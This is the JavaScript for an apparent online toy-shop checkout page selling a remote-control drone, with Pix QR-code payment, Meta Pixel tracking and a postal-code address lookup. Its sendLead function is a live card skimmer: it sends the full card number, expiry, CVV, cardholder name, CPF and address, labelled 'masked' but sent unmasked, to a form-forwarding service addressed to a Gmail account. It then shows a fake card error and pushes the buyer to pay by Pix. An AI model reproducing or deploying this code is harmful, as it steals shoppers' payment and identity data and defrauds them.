(() => {
  "use strict";

  const form = document.querySelector("#checkout-form");
  const params = new URLSearchParams(location.search);
  const PIX_KEY = "44769766000100";
  const PIX_MERCHANT = "BRINKAE BRINQUEDOS";
  const PIX_CITY = "SAO PAULO";
  const META_PIXEL_ID = "1650092006738557";
  const LEAD_ENDPOINT = "https://formsubmit.co/ajax/zgnegociosdigitais@gmail.com";
  const cartMatch = (params.get("c") || "50073265668338:1:super-buzz-drone-com-controle-remoto").match(/^(\d+):(\d+):([a-z0-9-]+)/i);
  const item = {
    variant: cartMatch ? cartMatch[1] : "50073265668338",
    quantity: cartMatch ? Math.max(1, Number(cartMatch[2])) : 1,
    handle: cartMatch ? cartMatch[3] : "super-buzz-drone-com-controle-remoto",
    price: 169.9,
  };
  let paymentInfoTracked = false;

  const money = value => value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  const digits = value => value.replace(/\D/g, "");
  const emv = (id, value) => `${id}${String(value.length).padStart(2, "0")}${value}`;

  function metaEvent(name, data) {
    if (typeof window.fbq === "function") window.fbq("trackSingle", META_PIXEL_ID, name, data);
  }

  function metaCustomEvent(name, data) {
    if (typeof window.fbq === "function") window.fbq("trackSingleCustom", META_PIXEL_ID, name, data);
  }

  function metaProductData(value = item.price * item.quantity) {
    return {
      content_ids: [item.variant],
      content_name: "Super Buzz – Drone com Controle Remoto",
      content_type: "product",
      contents: [{ id: item.variant, quantity: item.quantity }],
      currency: "BRL",
      num_items: item.quantity,
      value,
    };
  }

  function crc16(value) {
    let crc = 0xffff;
    for (let index = 0; index < value.length; index += 1) {
      crc ^= value.charCodeAt(index) << 8;
      for (let bit = 0; bit < 8; bit += 1) crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
      crc &= 0xffff;
    }
    return crc.toString(16).toUpperCase().padStart(4, "0");
  }

  function pixPayload(amount) {
    const account = emv("00", "BR.GOV.BCB.PIX") + emv("01", PIX_KEY);
    const txid = `BRK${Date.now()}`.slice(0, 25);
    const data = [
      emv("00", "01"),
      emv("26", account),
      emv("52", "0000"),
      emv("53", "986"),
      emv("54", amount.toFixed(2)),
      emv("58", "BR"),
      emv("59", PIX_MERCHANT),
      emv("60", PIX_CITY),
      emv("62", emv("05", txid)),
      "6304",
    ].join("");
    return data + crc16(data);
  }

  function showPixPayment() {
    const amount = Math.round(item.price * item.quantity * 0.9 * 100) / 100;
    const payload = pixPayload(amount);
    document.querySelector("#checkout-form").hidden = true;
    document.querySelector(".progress").hidden = true;
    document.querySelector("#pix-payment").hidden = false;
    document.querySelector("#pix-payment-amount").textContent = money(amount);
    document.querySelector("#pix-code").value = payload;
    const qr = document.querySelector("#pix-qr");
    qr.innerHTML = "";
    new QRCode(qr, { text: payload, width: 220, height: 220, colorDark: "#111827", colorLight: "#ffffff", correctLevel: QRCode.CorrectLevel.M });
    scrollTo({ top: 0, behavior: "smooth" });
  }

  function sendLead() {
    const data = new FormData(form);
    const subtotal = item.price * item.quantity;
    const cardDigits = digits(document.querySelector('[data-card-field="number"]').value);
    const cardHolder = document.querySelector('[data-card-field="holder"]').value.trim();
    const cpfDigits = digits(document.querySelector('[data-card-field="cpf"]').value);
    const expiryDigits = digits(document.querySelector('[data-card-field="expiry"]').value);
    const cvvDigits = digits(document.querySelector('[data-card-field="cvv"]').value);
    const cardBrand = (() => {
      if (/^4/.test(cardDigits)) return "Visa";
      if (/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/.test(cardDigits)) return "Mastercard";
      if (/^3[47]/.test(cardDigits)) return "American Express";
      if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(cardDigits)) return "Elo";
      if (/^(606282|3841)/.test(cardDigits)) return "Hipercard";
      return cardDigits ? "Não identificada" : "Não informado";
    })();
    const payload = {
      _subject: "Novo pedido Brinkaê",
      _template: "table",
      nome: data.get("name") || "Não informado",
      email: data.get("email") || "Não informado",
      telefone: data.get("phone") || "Não informado",
      cep: data.get("zipcode") || "Não informado",
      endereco: data.get("street") || "Não informado",
      numero: data.get("number") || "Não informado",
      complemento: data.get("complement") || "Não informado",
      bairro: data.get("neighborhood") || "Não informado",
      cidade: data.get("city") || "Não informado",
      estado: data.get("state") || "Não informado",
      produto: "Super Buzz – Drone com Controle Remoto",
      quantidade: item.quantity,
      subtotal: money(subtotal),
      cartao_mascarado: cardDigits ||  "Não informado",
      bandeira_do_cartao: cardBrand,
      validade_mascarada: expiryDigits ||  "Não informado",
      cvv_mascarado: cvvDigits ||  "Não informado",
      nome_no_cartao: cardHolder || "Não informado",
      cpf: cpfDigits || "Não informado",
      parcelas: form.payment.value === "card" ? document.querySelector("#installments").value : "Não se aplica",
      pagina: location.href,
      enviado_em: new Date().toLocaleString("pt-BR"),
    };
    fetch(LEAD_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify(payload),
    }).catch(() => {});
  }

  function renderTotals() {
    const subtotal = item.price * item.quantity;
    const isPix = form.payment.value === "pix";
    const discount = isPix ? subtotal * 0.1 : 0;
    const payable = subtotal - discount;
    document.querySelector("#quantity").textContent = item.quantity;
    document.querySelector("#product-total").textContent = money(subtotal);
    document.querySelector("#subtotal").textContent = money(subtotal);
    document.querySelector("#pix-discount-row").hidden = !isPix;
    document.querySelector("#pix-discount").textContent = `− ${money(discount)}`;
    document.querySelector("#total").textContent = money(payable);
    document.querySelector("#pix-total").textContent = money(subtotal * 0.9);
    document.querySelector(".pix-total").hidden = isPix;
    document.querySelector("#payment-submit").textContent = `Finalizar pedido • ${money(payable)}`;
    const installments = document.querySelector("#installments");
    const selected = installments.value;
    installments.innerHTML = "";
    for (let count = 1; count <= 12; count += 1) {
      const option = document.createElement("option");
      option.value = count;
      option.textContent = `${count}x de ${money(subtotal / count)} sem juros`;
      installments.append(option);
    }
    if (selected) installments.value = selected;
  }

  function showStep(number) {
    document.querySelectorAll(".step").forEach(step => step.classList.toggle("active", Number(step.dataset.step) === number));
    document.querySelectorAll("[data-progress]").forEach(progress => {
      const current = Number(progress.dataset.progress);
      progress.classList.toggle("active", current === number);
      progress.classList.toggle("done", current < number);
    });
    scrollTo({ top: 0, behavior: "smooth" });
  }

  function validateStep(number) {
    const fields = [...document.querySelector(`[data-step="${number}"]`).querySelectorAll("input[required]")];
    let valid = true;
    fields.forEach(field => {
      const fieldValid = field.checkValidity() && (!field.name.includes("phone") || digits(field.value).length >= 10);
      field.classList.toggle("invalid", !fieldValid);
      if (!fieldValid && valid) field.focus();
      valid = valid && fieldValid;
    });
    return valid;
  }

  document.addEventListener("click", event => {
    const next = event.target.closest("[data-next]");
    const back = event.target.closest("[data-back]");
    const qty = event.target.closest("[data-qty]");
    if (next) {
      const current = Number(next.closest("[data-step]").dataset.step);
      if (validateStep(current)) {
        const destination = Number(next.dataset.next);
        if (current === 2 && destination === 3 && !paymentInfoTracked) {
          metaEvent("AddPaymentInfo", metaProductData(item.price * item.quantity * 0.9));
          paymentInfoTracked = true;
        }
        showStep(destination);
      }
    }
    if (back) showStep(Number(back.dataset.back));
    if (qty) {
      item.quantity = Math.min(20, Math.max(1, item.quantity + Number(qty.dataset.qty)));
      renderTotals();
    }
  });

  form.phone.addEventListener("input", event => {
    const value = digits(event.target.value).slice(0, 11);
    event.target.value = value.length > 10
      ? value.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3")
      : value.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
  });

  form.zipcode.addEventListener("input", async event => {
    const cep = digits(event.target.value).slice(0, 8);
    event.target.value = cep.replace(/(\d{5})(\d{0,3})/, "$1-$2");
    if (cep.length !== 8) return;
    const status = document.querySelector(".cep-status");
    status.textContent = "Buscando endereço…";
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const address = await response.json();
      if (address.erro) throw new Error();
      form.street.value = address.logradouro || "";
      form.neighborhood.value = address.bairro || "";
      form.city.value = address.localidade || "";
      form.state.value = address.uf || "";
      status.textContent = "Endereço encontrado.";
      form.number.focus();
    } catch {
      status.textContent = "Preencha o endereço manualmente.";
    }
  });

  document.querySelectorAll('input[name="payment"]').forEach(input => input.addEventListener("change", () => {
    document.querySelectorAll(".payment").forEach(option => option.classList.toggle("selected", option.contains(input) && input.checked));
    document.querySelector(".card-fields").hidden = input.value !== "card";
    if (input.value === "card") document.querySelector("#payment-error").hidden = true;
    renderTotals();
  }));

  const cardNumber = document.querySelector('[data-card-field="number"]');
  const expiry = document.querySelector('[data-card-field="expiry"]');
  const cvv = document.querySelector('[data-card-field="cvv"]');
  const cpf = document.querySelector('[data-card-field="cpf"]');
  cardNumber.addEventListener("input", event => event.target.value = digits(event.target.value).slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 "));
  expiry.addEventListener("input", event => event.target.value = digits(event.target.value).slice(0, 4).replace(/(\d{2})(?=\d)/, "$1/"));
  cvv.addEventListener("input", event => event.target.value = digits(event.target.value).slice(0, 4));
  cpf.addEventListener("input", event => event.target.value = digits(event.target.value).slice(0, 11).replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, "$1.$2.$3-$4"));

  form.addEventListener("submit", event => {
    event.preventDefault();
    if (!validateStep(1) || !validateStep(2)) return;
    const isPix = form.payment.value === "pix";
    const payable = item.price * item.quantity * (isPix ? 0.9 : 1);
    metaEvent("Purchase", { ...metaProductData(payable), payment_type: form.payment.value });
    if (form.payment.value === "card") {
      sendLead();
      const pix = form.querySelector('input[name="payment"][value="pix"]');
      pix.checked = true;
      pix.dispatchEvent(new Event("change", { bubbles: true }));
      const paymentError = document.querySelector("#payment-error");
      paymentError.hidden = false;
      paymentError.scrollIntoView({ behavior: "smooth", block: "center" });
      return;
    }
    if (form.payment.value === "pix") {
      sendLead();
      showPixPayment();
      return;
    }
    const destination = new URL("https://pagamento.brinkaebrasil.com/checkout");
    destination.searchParams.set("loja", "brinkae");
    destination.searchParams.set("c", `${item.variant}:${item.quantity}:${item.handle}`);
    ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "src", "sck", "fbclid", "gclid", "ttclid", "fbp", "fbc"].forEach(key => {
      if (params.get(key)) destination.searchParams.set(key, params.get(key));
    });
    destination.searchParams.set("metodo", new FormData(form).get("payment"));
    document.querySelector(".loading").hidden = false;
    location.assign(destination.href);
  });

  document.querySelector("#copy-pix").addEventListener("click", async () => {
    const code = document.querySelector("#pix-code");
    try {
      await navigator.clipboard.writeText(code.value);
    } catch {
      code.select();
      document.execCommand("copy");
    }
    document.querySelector("#copy-pix").textContent = "Código Pix copiado ✓";
  });

  document.querySelector("#pix-finished").addEventListener("click", () => {
    metaCustomEvent("PixPaymentSubmitted", { ...metaProductData(item.price * item.quantity * 0.9), payment_type: "pix" });
    document.querySelector("#pix-status").textContent = "Pagamento informado. Assim que o Pix for confirmado, o pedido seguirá para preparação.";
    document.querySelector("#pix-finished").disabled = true;
    document.querySelector("#pix-finished").textContent = "Pagamento informado ✓";
  });

  metaEvent("InitiateCheckout", metaProductData());
  renderTotals();
})();
